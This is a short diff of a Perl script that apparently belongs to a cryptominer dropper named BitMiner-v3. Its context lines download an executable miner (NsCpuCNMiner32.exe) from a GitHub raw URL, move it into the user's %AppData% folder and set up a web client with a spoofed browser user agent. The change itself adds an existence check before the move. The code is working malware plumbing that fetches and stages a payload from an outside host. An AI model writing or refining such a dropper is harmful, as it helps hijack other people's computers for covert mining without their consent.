@@ -116,7 +116,9 @@ while(1){
     }else{
       getstore(\'https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\', \'NsCpuCNMiner.exe\');
     }
-    system(\'move NsCpuCNMiner.exe %AppData%\');
+    if(-e \'NsCpuCNMiner.exe\'){
+      system(\'move NsCpuCNMiner.exe %AppData%\');
+    }
     $check = qx/dir %AppData%/;
   }
   my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0\');
